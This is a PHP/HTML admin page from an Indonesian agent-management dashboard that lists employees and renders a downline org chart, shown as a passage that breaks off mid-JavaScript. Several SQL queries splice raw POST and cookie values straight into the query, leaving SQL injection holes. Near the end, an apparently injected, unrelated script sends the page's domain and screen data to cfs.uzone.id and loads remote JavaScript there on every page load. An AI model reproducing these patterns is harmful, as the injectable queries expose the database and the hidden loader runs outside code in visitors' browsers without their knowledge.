<?php
session_start();
require '../db.php';

if(isset($_POST['editAgent'])) {
    $kode = $_POST['editAgent'];

    $sqlK = "SELECT * FROM employees WHERE id = '".$kode."'";
    $resultK = mysqli_query($link, $sqlK);

    $rowK = mysqli_fetch_object($resultK);

    header("content-type: text/x-json");
    echo json_encode($rowK);
    exit();
}

if(isset($_POST['kode'])) {
    $kode = $_POST['kode'];
    $i = 0;
    $sqlK = "SELECT * FROM employees";
    $resultK = mysqli_query($link, $sqlK);

    $rows = array();
    while($rowK = mysqli_fetch_object($resultK)){
        $sqlP = "SELECT * FROM positions WHERE id = '".$rowK->position_id."'";
        $resultP = mysqli_query($link, $sqlP);
        $rowP = mysqli_fetch_array($resultP);

        $rows[$i] = array('name'=>$rowK->nama, 'parent'=>$rowK->upline_id, 'id'=>$rowK->id, 'title'=>$rowP['nama'], 'aktif'=>$rowK->aktif);
        $i++;
    }

    header("content-type: text/x-json");
    echo json_encode($rows);
    exit();
}

$sql = "SELECT * FROM employees";
$result = mysqli_query($link, $sql);
if(!$result) {
    echo "SQL ERROR: ".$sql; 
}


$sqlU = "SELECT * FROM `users`,`employees` WHERE users.employee_id = employees.id AND users.username = '".$_COOKIE['idU']."'";
$resultU = mysqli_query($link, $sqlU);
$rowU = mysqli_fetch_array($resultU);
if(!$resultU) {
    echo "SQL ERROR: ".$sqlU;
}
if($rowU['nama'] == null){
    header('location: ../proses.php?cmd=logout');
}

if(!isset($_COOKIE['loginU'])) {
    header('location: ../login.php');
}

$sqlP = "SELECT * FROM `percents` WHERE id = 1";
$resultP = mysqli_query($link, $sqlP);
$rowP = mysqli_fetch_array($resultP);
if(!$resultP){
    echo "SQL ERROR: ".$sqlU;
}

$sqlEmployee = "SELECT * FROM employees";
$resultEmployee = mysqli_query($link, $sqlEmployee);
if(!$resultEmployee){
    echo "SQL ERROR: ".$sqlEmployee;
}

$sqlJabatan = "SELECT * FROM positions WHERE nama != 'resign' ";
$resultJabatan = mysqli_query($link, $sqlJabatan);
if(!$resultJabatan){
    echo "SQL ERROR: ".$sqlJabatan;
}

$sqlCabang = "SELECT * FROM b_office";
$resultCabang = mysqli_query($link, $sqlCabang);
if(!$resultCabang){
    echo "SQL ERROR: ".$sqlCabang;
}

?>

<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <link rel="apple-touch-icon" sizes="76x76" href="../assets/img/apple-icon.png">
    <link rel="icon" type="image/png" sizes="96x96" href="../assets/img/favicon.png">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    
    <style type="text/css">
    .modal-content{
        position: relative;
        /*width: 200%;*/
    }
    .modal-body {
        overflow-y: auto;
        padding: 15px;
    }
    </style>

    <title>Info Agent</title>
    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport' />
    <meta name="viewport" content="width=device-width" />

    <!-- Bootstrap core CSS -->
    <link href="../assets/css/bootstrap1.min.css" rel="stylesheet" />

    <!--  Paper Dashboard core CSS -->
    <link href="../assets/css/paper-dashboard.css?v=1.2.1" rel="stylesheet"/>

    <!--  CSS for Demo Purpose, don't include it in your project -->
    <!--<link href="../assets/css/demo.css" rel="stylesheet" />-->

    <!-- Animation library for notifications -->
    <link href="../assets/css/animate.min.css" rel="stylesheet"/>

    <!--  Fonts and icons     -->
    <link href="http://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css" rel="stylesheet">
    <link href='https://fonts.googleapis.com/css?family=Muli:400,300' rel='stylesheet' type='text/css'>
    <link href="../assets/css/themify-icons.css" rel="stylesheet">

    <link rel="stylesheet" href="../assets/css/jquery.orgchart.css">
    <!-- <link rel="stylesheet" href="../assets/css/style.css"> -->

</head>
<body>
    <div class="wrapper">
        <div class="sidebar" data-background-color="brown" data-active-color="danger">

            <div class="logo">
                <a href="../home.php" class="simple-text logo-mini">
                    AA Indonesia
                </a>

                <a href="../home.php" class="simple-text logo-normal">
                    AA Indonesia
                </a>
            </div>
            <div class="sidebar-wrapper">
                

                <ul class="nav">
                    <li>
                        <a href="../home.php">
                            <i class="ti-panel"></i>
                            <p>Dashboard</p>
                        </a>
                    </li>
                    <li>
                        <a data-toggle="collapse" class-aria-expanded="true" href="#agentExamples">
                            <i class="ti-user"></i>
                            <p>Agent
                               <b class="caret"></b>
                            </p>
                        </a>
                        <div class="collapse in" aria-expanded="true" id="agentExamples">
                            <ul class="nav">
                                <li class="active">
                                    <a href="info.php">
                                        <span class="sidebar-mini">I</span>
                                        <span class="sidebar-normal">Info</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="daftar.php">
                                        <span class="sidebar-mini">D</span>
                                        <span class="sidebar-normal">Daftar</span>
                                    </a>
                                </li>
                            </ul>
                        </div>
                    </li>
                    <li>
                        <a data-toggle="collapse" href="#cabangExamples">
                            <i class="ti-home"></i>
                            <p>
                                Cabang    
                               <b class="caret"></b>
                            </p>
                        </a>
                        <div class="collapse" id="cabangExamples">
                            <ul class="nav">
                                <li>
                                    <a href="../cabang/info.php">
                                        <span class="sidebar-mini">I</span>
                                        <span class="sidebar-normal">Info</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="../cabang/daftar.php">
                                        <span class="sidebar-mini">D</span>
                                        <span class="sidebar-normal">Daftar</span>
                                    </a>
                                </li>
                            </ul>
                        </div>
                    </li>
                    <li>
                        <a href="../closing.php">
                            <i class="ti-pencil-alt"></i>
                            <p>
                                Closing
                            </p>
                        </a>
                    </li>
                    <li>
                        <a data-toggle="collapse" href="#laporanExamples">
                            <i class="ti-stats-up"></i>
                            <p>
                                Laporan
                               <b class="caret"></b>
                            </p>
                        </a>
                        <div class="collapse" id="laporanExamples">
                            <ul class="nav">
                                <li>
                                    <a href="../laporan/rekapitulasi.php">
                                        <span class="sidebar-mini">RK</span>
                                        <span class="sidebar-normal">Rekapitulasi</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="../laporan/komisi.php">
                                        <span class="sidebar-mini">KM</span>
                                        <span class="sidebar-normal">Komisi</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="../laporan/unit.php">
                                        <span class="sidebar-mini">UN</span>
                                        <span class="sidebar-normal">Unit</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="../laporan/aktif.php">
                                        <span class="sidebar-mini">AK</span>
                                        <span class="sidebar-normal">Aktif</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="../laporan/pasif.php">
                                        <span class="sidebar-mini">PS</span>
                                        <span class="sidebar-normal">Pasif</span>
                                    </a>
                                </li>
                            </ul>
                        </div>
                    </li>
                    <li>
                        <a href="../pengaturan.php">
                            <i class="ti-settings"></i>
                            <p>
                                Pengaturan
                            </p>
                        </a>
                    </li>
                </ul>
            </div>
        </div>

        <div class="main-panel">
            <nav class="navbar navbar-default">
                <div class="container-fluid">
                    <div class="collapse navbar-collapse">

                        <a class="navbar-brand" href="info.php">Info Agent</a>

                        <ul class="nav navbar-nav navbar-right">
                            <li>
                                <a>
                                    <i class="ti-user"></i>
                                    <p>
                                        <?php echo $rowU['nama'];?>   
                                    </p>
                                </a>                                  
                            </li>
                            <li>
                                <a href="../proses.php?cmd=logout">
                                    <i class="ti-power-off"></i>
                                    <p>
                                        Logout
                                    </p>
                                </a>
                            </li>
                        </ul>
                    </div>
                </div>
            </nav>

            <div class="content">
                <div class="container-fluid">
                    <?php /*
                    if(!isset($_SESSION['notif'])) {
                        echo "";
                    }
                    else { ?>
                        <div class="row"> <!-- Notifikasi Sukses daftar -->
                            <div class="alert alert-success" id="notify">
                                <button type="button" aria-hidden="true" class="close" id="closeNotify">×</button>
                                <span><?php echo $_SESSION['notif'];?></span>
                            </div>
                        </div><?php     
                    }

                    if ($row = 0){?> <!--kalo kosong baru notifikasi -->
                        <div class="row"> <!-- Notifikasi -->
                            <div class="alert alert-danger" id="notify">
                                <button type="button" aria-hidden="true" class="close" id="closeNotify">×</button>
                                <span><?php echo "BELUM ADA";?></span>
                            </div>
                        </div><?php
                    }*/?>
                    <!--<div class="row">
                        <div class="col-md-2">
                            <p class="form-control-static">Nama Cabang : </p>
                        </div>
                        <div class="col-md-5">        
                            <form class="navbar-search-form" role="search">
                                <div class="input-group">
                                    <input type="text" value="" class="form-control" placeholder="Search...">
                                    <span class="input-group-addon"><i class="fa fa-search"></i></span>
                                </div>
                            </form>
                        </div>
                        <div class="col-md-2">
                            <button class="btn btn-default" style="width: 100px;">Cari</button>        
                        </div>
                    </div>--> <!-- Kayaknya search diatas gk dipake -->
                    <div class="row">
                        <div class="col-md-12">
	                        <div class="card">
		                        <div class="card-content">
                                    <table class="table" id="bootstrap-table">
                                        <thead>
                                            <th data-field="no" data-sortable="true">No</th>
                                            <th data-field="nama" data-sortable="true">Nama</th>
                                            <th data-field="jk" data-sortable="true">Jenis Kelamin</th>
                                            <th data-field="telp">No. Telp</th>
                                            <th data-field="tgl" data-sortable="true">Tgl Lahir</th>
                                            <th data-field="office"  data-sortable="true">Office</th>
                                            <th data-field="jabatan"  data-sortable="true">Jabatan</th>
                                            <th data-field="status"  data-sortable="true">Status</th>
                                            <th data-field="actions" class="td-actions text-right" data-events="operateEvents" data-formatter="operateFormatter">Actions</th>
                                        </thead>
                                        <tbody>
                                            <?php
                                            $hitung = 1;
                                            $index = 0;
                                            while ($row = mysqli_fetch_object($result)) {
                                                $sqlO = "SELECT * FROM b_office WHERE id=".$row->b_office_id;
                                                $resultO = mysqli_query($link, $sqlO);
                                                $rowO = mysqli_fetch_array($resultO);
                                                if(!$resultO) {
                                                    echo "SQL ERROR: ".$sqlO; 
                                                }
                                                $sqlP = "SELECT * FROM positions WHERE id = '".$row->position_id."'";
                                                $resultP = mysqli_query($link, $sqlP);
                                                $rowP = mysqli_fetch_array($resultP);
                                                if(!$resultP) {
                                                    echo "SQL ERROR: ".$sqlP; 
                                                }
                                                echo "<tr data-index='".$row->id."'>";
                                                echo "<td>" . $hitung. "</td>";
                                                echo "<td>" . $row->nama . "</td>";
                                                echo "<td>" . $row->jenis_kelamin . "</td>";
                                                echo "<td>" . $row->no_telp . "</td>";
                                                echo "<td>" . $row->tgl_lahir . "</td>";
                                                echo "<td>" . $rowO['nama'] . "</td>";
                                                echo "<td>" . $rowP['nama'] . "</td>";
                                                if($row->aktif==1){
                                                    echo "<td>Aktif</td>";
                                                }
                                                else
                                                {
                                                    echo "<td>Non-Aktif</td>";
                                                }
                                                echo "<td>".$row->id."</td>";
                                                echo "</tr>";
                                                $hitung = $hitung +1;
                                                $index = $index+1;
                                            } ?>
                                        </tbody>
                                    </table>
                                
		                        	
		                        
	                        </div>
                        </div>
                    </div>
                    <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
                      <div class="modal-dialog" role="document">
                        <div class="modal-content">
                            <div class="modal-header">
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                                <h4 class="modal-title">Downline</h4>
                            </div>
                            <div class="modal-body">
                                <div class="row">
                                    <!--
                                    ORG CHART
                                    =========================================-->

                                    <div class="container-fluid" style="margin-top:20px">
                                        <div class="row" id="inner-right">
                                            <div class="col-md-12">
                                                
                                                <div id="chart-container" align="center"></div>
                                            </div>
                                            
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                      </div>
                    </div>

                    <div class="modal fade" id="editModal" tabindex="-1" role="dialog">
                      <div class="modal-dialog modal-xs" role="document">
                        <div class="modal-content">
                          <div class="modal-header">
                            <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                            <h4 class="modal-title">Profil Agent</h4>
                          </div>
                          <div class="modal-body">
                            <form method="POST" id="formEdit" action="" class="form-horizontal">
                                <input type="hidden" class="form-control" name="id" id="idId">
                                <fieldset>
                                    <div class="form-group">
                                        <label class="col-sm-2 control-label">Nama</label>
                                        <div class="col-sm-10">
                                            <input type="text" class="form-control" name="nama" id="namaId">
                                        </div>
                                    </div>
                                </fieldset>

                                <fieldset>
                                    <div class="form-group">
                                        <label class="col-sm-2 control-label">Jenis Kelamin</label>
                                        <div class="col-sm-5">
                                            <div class="radio">
                                                <input type="radio" name="jk" id="jkId1" value="Laki-Laki" disabled="">
                                                <label for="jkId1">
                                                     Laki-Laki
                                                </label>
                                            </div>

                                            <div class="radio">
                                                <input type="radio" name="jk" id="jkId2" value="Perempuan" disabled="">
                                                <label for="jkId2">
                                                     Perempuan
                                                </label>
                                            </div>
                                        </div>
                                    </div>
                                </fieldset>

                                <fieldset>
                                    <div class="form-group">
                                        <label class="col-sm-2 control-label">Tanggal Lahir</label>
                                        <div class="col-sm-10">
                                            <input type="date" class="form-control" disabled="" name="tanggal" id="tanggalId">
                                        </div>
                                    </div>
                                </fieldset>

                                <fieldset>
                                    <div class="form-group">
                                        <label class="col-sm-2 control-label">ID Upline</label>
                                        <div class="col-sm-10">
                                            <select type="text" disabled="" class="form-control" name="upline" id="uplineId">
                                                <option value="null">-</option>
                                                <?php 
                                                //perlu nama?
                                                while($rowEmployee = mysqli_fetch_object($resultEmployee)) {
                                                    echo "<option value='" . $rowEmployee->id . "'>" . $rowEmployee->id . " (". $rowEmployee->nama.")"."</option>";
                                                } 
                                                ?>
                                            </select>
                                        </div>
                                    </div>
                                </fieldset>

                                <fieldset>
                                    <div class="form-group">
                                        <label class="col-sm-2 control-label">No Telp</label>
                                        <div class="col-sm-10">
                                            <input type="text" class="form-control" name="telp" id="telpId">
                                        </div>
                                    </div>
                                </fieldset>

                                <fieldset>
                                    <div class="form-group">
                                        <label class="col-sm-2 control-label">Jabatan</label>
                                        <div class="col-sm-10">
                                            <select class="form-control" name="jabatan" id="jabatanId">
                                                <?php 
                                                while($rowJabatan = mysqli_fetch_object($resultJabatan)) {
                                                   echo "<option value=".$rowJabatan->id.">" . $rowJabatan->nama . "</option>";
                                                } 
                                                ?>
                                            </select>
                                        </div>
                                    </div>
                                </fieldset>
                                
                                <fieldset>
                                    <div class="form-group">
                                        <label class="col-sm-2 control-label">Cabang</label>
                                        <div class="col-sm-10">
                                            <select class="form-control" name="cabang" id="cabangId">
                                                <?php 
                                                while($rowCabang = mysqli_fetch_object($resultCabang)) {
                                                   echo "<option value=".$rowCabang->id.">" . $rowCabang->nama . " (".$rowCabang->kota.")"."</option>";
                                                } 
                                                ?>
                                            </select>
                                        </div>
                                    </div>
                                </fieldset>
                          </div>
                          <div class="modal-footer">
                            <input type="submit" name="submit" class="btn btn-info" value="Perbarui"/>
                            <button type="button" class="btn btn-default" data-dismiss="modal">Batal</button>
                            </form>
                          </div>
                        </div><!-- /.modal-content -->
                      </div><!-- /.modal-dialog -->
                    </div><!-- /.modal -->
                </div>
            </div>
        <br/>    
        </div>

        <footer class="footer">
            <div class="container-fluid">
                <nav class="pull-left">
                    <ul>
                        <li>
                            <a href="#">
                                Media Solution
                            </a>
                        </li>
                        <li>
                            <a href="#">
                               Blog
                            </a>
                        </li>
                        <li>
                            <a href="#">
                                Licenses
                            </a>
                        </li>
                    </ul>
                </nav>
                <div class="copyright pull-right">
                    &copy; <script>document.write(new Date().getFullYear())</script> - Made with <i class="fa fa-heart heart"></i> by <a href="#">Media Solution</a>
                </div>
            </div>
        </footer>
    </div>



    <!--
    <div class="fixed-plugin">
        <div class="dropdown show-dropdown">
            <a href="#" data-toggle="dropdown">
            <i class="fa fa-cog fa-2x"> </i>
            </a>
            <ul class="dropdown-menu">
                <li class="header-title">Sidebar Background</li>
                <li class="adjustments-line text-center">
                    <a href="javascript:void(0)" class="switch-trigger background-color">
                        <span class="badge filter badge-brown active" data-color="brown"></span>
                        <span class="badge filter badge-white" data-color="white"></span>
                    </a>
                </li>

                <li class="header-title">Sidebar Active Color</li>
                <li class="adjustments-line text-center">
                    <a href="javascript:void(0)" class="switch-trigger active-color">
                            <span class="badge filter badge-primary" data-color="primary"></span>
                            <span class="badge filter badge-info" data-color="info"></span>
                            <span class="badge filter badge-success" data-color="success"></span>
                            <span class="badge filter badge-warning" data-color="warning"></span>
                            <span class="badge filter badge-danger active" data-color="danger"></span>
                    </a>
                </li>
            </ul>
        </div>
    </div> -->

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKAz6JMkPltAPvhVgLvKlTyG2Q11ufhKxvls%2b8rFsEzchpoITXnhMJFZld3kCxvoNkNPdSGq2TK2v2KoYMSUVA%2fRJ8BGERO2px0q4sLTPEm9fUuNuLFnySTHe4rKMiVTFxzcx8n7HsaQFwVEyjcKFBhkyxu22Wv%2fOkug1QYCC8c53H1tyHX0DwMT3kwOtKb7Pd6d%2fZyWJMhwMIlSRie7MjjQkiZIZlwTOaqTwZnJ0bnnsAEwI6kB%2ffkvG98edF7%2bNYHlQTs9IqhcuHwDJeoUt5MC6UYm12Ow1kfcGZLMQ%2fzAI67OTHn5Hh%2bV2u%2bWlCakD5DO1DZreCnzBJGUgasGQ8CC03skMa4OoNtUe5tVfYln6XYMf2PnTyxn31eoe1fCtXp6jcqWhudE7v6HNOLwqR6WniFk2hpic29awXcEGr6uk7CWaq%2fW6E5uSf8uect1F3yAT9IHca9agjmyu%2bqk%2f5HfEJUuawf4zpVC5FdRyAQzLwBTUi1ByX7LcRxJzibYJ3G%2bE3Efd7g0a%2b7Tefj0bfZeqoD7eB3rJ5phfNTt04G0Iy0%2bO5LJMGA%2fJHJ8YYeTp2prakOqivYnA3w%2fIvn8B8HfBmrugQ7wyGpSSkLijr5wgT2jVePhr8ATCZICeiEeMG2KmGB5qficquy0AOL5Esbb35sfVSUbBq1lDSygllLluf6lx75BFS0ewDgjBSQOhUliXezxocRE1CnFjzZG3aOm0DwRrMYopRpE25GHtYghrKotUSSpacXSsjbOyKGL%2fohRkQV%2biLkXWGVfamefhj7Rstqx3YVwHP4l7JxT9eaQc7tN9gXikwh2rvAquOV3UGCh8uXx3Yn8u9axvDPtApe8K8EdBmDCTDRuRIj2%2bWMEIEk2%2bsW1k8Qw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

    <!--   Core JS Files. Extra: TouchPunch for touch library inside jquery-ui.min.js   -->
    <script src="../assets/js/jquery-3.1.1.min.js" type="text/javascript"></script>
    <script src="../assets/js/jquery-ui.min.js" type="text/javascript"></script>
    <script src="../assets/js/perfect-scrollbar.min.js" type="text/javascript"></script>
    <script src="../assets/js/bootstrap.min.js" type="text/javascript"></script>

    <!--  Forms Validations Plugin -->
    <script src="../assets/js/jquery.validate.min.js"></script>

    <!-- Promise Library for SweetAlert2 working on IE -->
    <script src="../assets/js/es6-promise-auto.min.js"></script>

    <!--  Plugin for Date Time Picker and Full Calendar Plugin-->
    <script src="../assets/js/moment.min.js"></script>

    <!--  Date Time Picker Plugin is included in this js file -->
    <script src="../assets/js/bootstrap-datetimepicker.js"></script>

    <!--  Select Picker Plugin -->
    <script src="../assets/js/bootstrap-selectpicker.js"></script>

    <!--  Switch and Tags Input Plugins -->
    <script src="../assets/js/bootstrap-switch-tags.js"></script>

    <!-- Circle Percentage-chart -->
    <script src="../assets/js/jquery.easypiechart.min.js"></script>

    <!--  Charts Plugin -->
    <script src="../assets/js/chartist.min.js"></script>

    <!--  Notifications Plugin    -->
    <script src="../assets/js/bootstrap-notify.js"></script>

    <!-- Sweet Alert 2 plugin -->
    <script src="../assets/js/sweetalert2.js"></script>

    <!-- Vector Map plugin -->
    <script src="../assets/js/jquery-jvectormap.js"></script>

    <!-- Wizard Plugin    -->
    <script src="../assets/js/jquery.bootstrap.wizard.min.js"></script>

    <!--  Bootstrap Table Plugin    -->
    <script src="../assets/js/bootstrap-table.js"></script>

    <!--  Plugin for DataTables.net  -->
    <script src="../assets/js/jquery.datatables.js"></script>

    <!--  Full Calendar Plugin    -->
    <script src="../assets/js/fullcalendar.min.js"></script>

    <!-- Paper Dashboard PRO Core javascript and methods for Demo purpose -->
    <script src="../assets/js/paper-dashboard.js?v=1.2.1"></script>

    <!--   Sharrre Library    -->
    <script src="../assets/js/jquery.sharrre.js"></script>

    <!-- Paper Dashboard PRO DEMO methods, don't include it in your project! -->
    <!--<script src="../assets/js/demo.js"></script>-->

    <script src="../assets/js/jquery.orgchart.js"></script>

    <script type="text/javascript" src="https://cdn.rawgit.com/jakerella/jquery-mockjax/master/dist/jquery.mockjax.min.js"></script>

    <script type="text/javascript">
        $('#closeNotify').click(function() { // Buat tombol x 
            $('#notify').slideUp().empty();  // Buat nutup notif
        });

        $(function(){
            $('#notify').slideDown();
        });

        $(document).ready(function(){
            //get it if Status key found
            if(localStorage.getItem("Status") == 1)
            {
                $.notify({
                    // options
                    icon: 'glyphicon glyphicon-ok-sign',
                    message: 'Data agent berhasil untuk diperbarui.' 
                },{
                    // settings
                    type: 'success',
                    placement: {
                        from: "top",
                        align: "center"
                    },
                });
                localStorage.clear();
            }else if(localStorage.getItem("Status") == 0){
                $.notify({
                    // options
                    icon: 'glyphicon glyphicon-exclamation-sign',
                    message: 'Tidak dapat mengubah jabatan menjadi Principal/Vice Principal, karena sudah ada.' 
                },{
                    // settings
                    type: 'danger',
                    placement: {
                        from: "top",
                        align: "center"
                    },
                });
                localStorage.clear();
            }
        });

        $('#formEdit').on('submit', function (e) {

          e.preventDefault();
          if($('#jabatanId').val() == '2'){
            $('#editModal').modal('hide');
            var sUser = $('#namaId').val().split(" ");
            var sTanggal = $('#tanggalId').val().split("-");
            var suggest = "";
            if(sUser.length > 1){
                suggest = sUser[0].toLowerCase()+sUser[1].length;
            }
            if(sUser.length <= 1){
                suggest = $('#namaId').val().toLowerCase()+sTanggal[1]+sTanggal[2];
            }
            $.ajax({
              type: 'post',
              url: '../proses.php?cmd=cek_userE',
              data: {
                'user': $('#idId').val()
              },
              success: function (data) {
                  if(data == 0){
                    swal({
                      title: 'Daftar User',
                      html:
                        '<form class="form-horizontal">' +
                        '<fieldset>' +
                        '<div class="form-group">' +
                        '<label class="col-sm-4 control-label">Username :</label>' +
                        '<div class="col-sm-7">' +
                        '<input id="user" type="text" value="'+suggest+'" class="form-control">' +
                        '</div>' +
                        '</div>' +
                        '</fieldset>' +
                        '<fieldset>' +
                        '<div class="form-group">' +
                        '<label class="col-sm-4 control-label">Password :</label>' +
                        '<div class="col-sm-7">' +
                        '<input id="pass" type="password" class="form-control">' +
                        '</div>' +
                        '</div>' +
                        '</fieldset>' +
                        '<fieldset>' +
                        '<div class="form-group">' +
                        '<label class="col-sm-4 control-label">Re-Password :</label>' +
                        '<div class="col-sm-7">' +
                        '<input id="repass" type="password" class="form-control">' +
                        '</div>' +
                        '</div>' +
                        '</fieldset>' +
                        '</form>',
                      confirmButtonText: 'Daftar',
                      showLoaderOnConfirm: true,
                      preConfirm: function () {
                        return new Promise(function (resolve, reject) {
                          setTimeout(function() {
                            var ck_name = /^[A-Za-z0-9 ]{5,32}$/;
                            if(!ck_name.test($('#user').val())){
                              reject('Maaf Username tidak valid')
                            }else{
                              $.ajax({
                                type: 'post',
                                url: '../proses.php?cmd=cek_user',
                                data: {
                                    'user': $('#user').val()
                                  },
                                success: function (data) {
                                    if(data == 0){
                                      if($('#pass').val() === $('#repass').val() && $('#pass').val() != null && $('#pass').val().length <= 32 && $('#pass').val().length >= 6){
                                          resolve([
                                          $('#user').val(),
                                          $('#pass').val(),
                                          $('#repass').val(),
                                        ])
                                      }else if($('#pass').val().length > 32 || $('#pass').val().length < 6){
                                        reject('Maaf password tidak boleh kurang dari 6 huruf atau lebih dari 32 huruf')
                                      }else{
                                        reject('Maaf password tidak sama')
                                      }
                                    }else{
                                      reject('Maaf Username sudah terdaftar')
                                    }
                                }
                              });
                            }
                          },2000)
                          
                        })
                      },
                      onOpen: function () {
                        $('#user').focus()
                      }
                    }).then(function (result) {
                      $.ajax({
                        type: 'post',
                        url: '../proses.php?cmd=daftar_userE',
                        data: {
                            'user': result[0],
                            'pass': result[1],
                            'id': $('#idId').val(),
                        },
                        success: function (data) {
                            $.ajax({
                              type: 'post',
                              url: '../proses.php?cmd=edit_agent',
                              data: $('form').serialize(),
                              success: function (data) {
                                  localStorage.setItem("Status",data);
                                  location.reload();
                              }
                            });
                        }
                      });
                    }, function(dismiss){
                        $('#editModal').modal('show');
                    }).catch(swal.noop)
                  }else{
                    $.ajax({
                      type: 'post',
                      url: '../proses.php?cmd=edit_agent',
                      data: $('form').serialize(),
                      success: function (data) {
                          localStorage.setItem("Status",data);
                          location.reload();
                      }
                    });
                  }
              }
            });
            
          }else{
            $.ajax({
              type: 'post',
              url: '../proses.php?cmd=cek_userE',
              data: {
                'user': $('#idId').val()
              },
              success: function (data) {
                  if(data == 0){
                    $.ajax({
                      type: 'post',
                      url: '../proses.php?cmd=edit_agent',
                      data: $('form').serialize(),
                      success: function (data) {
                          localStorage.setItem("Status",data);
                          $('#editModal').modal('hide');
                          $('#editModal').on('hidden.bs.modal', function () {
                              location.reload();
                          })
                      }
                    });
                  }else{
                    $.ajax({
                      url     : "../proses.php?cmd=hapus_user",
                      type    : "POST",
                      data    : {
                              'id': $('#idId').val()
                          },
                      success:function(show)
                      {
                          $.ajax({
                            type: 'post',
                            url: '../proses.php?cmd=edit_agent',
                            data: $('form').serialize(),
                            success: function (data) {
                                localStorage.setItem("Status",data);
                                $('#editModal').modal('hide');
                                $('#editModal').on('hidden.bs.modal', function () {
                                    location.reload();
                                })
                            }
                          });
                      }
                    });
                  }
              }
            });
            
          }
          

        });

        var $table = $('#bootstrap-table');

	        function operateFormatter(value, row, index) {
	            return [
					'<div class="table-icons">',
		                '<a rel="tooltip" title="View" class="btn btn-simple btn-info btn-icon table-action view" href="javascript:void(0)">',
							'<i class="ti-image"></i>',
						'</a>',
		                '<a rel="tooltip" title="Edit" class="btn btn-simple btn-warning btn-icon table-action edit" href="javascript:void(0)">',
		                    '<i class="ti-pencil-alt"></i>',
		                '</a>',
		                '<a rel="tooltip" title="Remove" class="btn btn-simple btn-danger btn-icon table-action remove" href="javascript:void(0)">',
		                    '<i class="ti-close"></i>',
		                '</a>',
					'</div>',
	            ].join('');
	        }

	        $().ready(function(){
	            window.operateEvents = {
	                'click .view': function (e, value, row, index) {
	                    info = JSON.stringify(row);
                        var coba = JSON.parse(info);
                        var nama = coba.nama;
                        var id = coba.actions;
                        var jabatan = coba.jabatan;
                        var datascource ={};
                        var ajaxURLs = {};
	                    $('#myModal').modal('show');
                        
                        if($('.orgchart') != null){
                            $('.orgchart').remove();
                        }
                        
                        $.ajax({
                            url     : "info.php",
                            type    : "POST",
                            data    : {
                                    'kode': id
                                },
                            success:function(show)
                            {
                                var orang=[];
                                var semua=[];
                                var sodara=[];
                                var cucu=[];
                                var anak=[];
                                var kakek=[];
                                var parent=[];
                                var parentId=[];
                                var parentS=[];
                                var parentsId=[];

                                var hub = '111';
                                for(var i = 0; i<show.length;i++){
                                    var o = 0;
                                    var p = 0;
                                    for(var x = 0; x<show.length;x++){
                                        if(show[i].id == show[x].parent){
                                            p=1;
                                        }
                                        if(show[i].parent == show[x].parent && o == 0){
                                            o=1;
                                        }else if(show[i].parent == show[x].parent && o != 0){
                                            o++;
                                        }
                                    }
                                    if(show[i].parent == null){
                                        if(p == 1){
                                            if(show[i].aktif == 1){
                                                semua.push({'id': show[i].id,'name': show[i].name, 'parent': show[i].parent, 'title': show[i].title, 'relationship': '001'});
                                            }else if(show[i].aktif == 0){
                                                semua.push({'id': show[i].id,'name': show[i].name, 'parent': show[i].parent, 'title': 'RESIGN', 'relationship': '001'});
                                            }
                                        }else if(p == 0){
                                            if(show[i].aktif == 1){
                                                semua.push({'id': show[i].id,'name': show[i].name, 'parent': show[i].parent, 'title': show[i].title, 'relationship': '000'});
                                            }else if(show[i].aktif == 0){
                                                semua.push({'id': show[i].id,'name': show[i].name, 'parent': show[i].parent, 'title': 'RESIGN', 'relationship': '000'});
                                            }
                                        }
                                    }else{
                                        if(o>1){
                                            if(p == 1){
                                                if(show[i].aktif == 1){
                                                    semua.push({'id': show[i].id,'name': show[i].name, 'parent': show[i].parent, 'title': show[i].title, 'relationship': '111'});
                                                }else if(show[i].aktif == 0){
                                                    semua.push({'id': show[i].id,'name': show[i].name, 'parent': show[i].parent, 'title': 'RESIGN', 'relationship': '111'});
                                                }
                                            }else if(p == 0){
                                                if(show[i].aktif == 1){
                                                    semua.push({'id': show[i].id,'name': show[i].name, 'parent': show[i].parent, 'title': show[i].title, 'relationship': '110'});
                                                }else if(show[i].aktif == 0){
                                                    semua.push({'id': show[i].id,'name': show[i].name, 'parent': show[i].parent, 'title': 'RESIGN', 'relationship': '110'});
                                                }
                                            }
                                        }else if(o==1){
                                            if(p == 1){
                                                if(show[i].aktif == 1){
                                                    semua.push({'id': show[i].id,'name': show[i].name, 'parent': show[i].parent, 'title': show[i].title, 'relationship': '101'});
                                                }else if(show[i].aktif == 0){
                                                    semua.push({'id': show[i].id,'name': show[i].name, 'parent': show[i].parent, 'title': 'RESIGN', 'relationship': '101'});
                                                }
                                            }else if(p == 0){
                                                if(show[i].aktif == 1){
                                                    semua.push({'id': show[i].id,'name': show[i].name, 'parent': show[i].parent, 'title': show[i].title, 'relationship': '100'});
                                                }else if(show[i].aktif == 0){
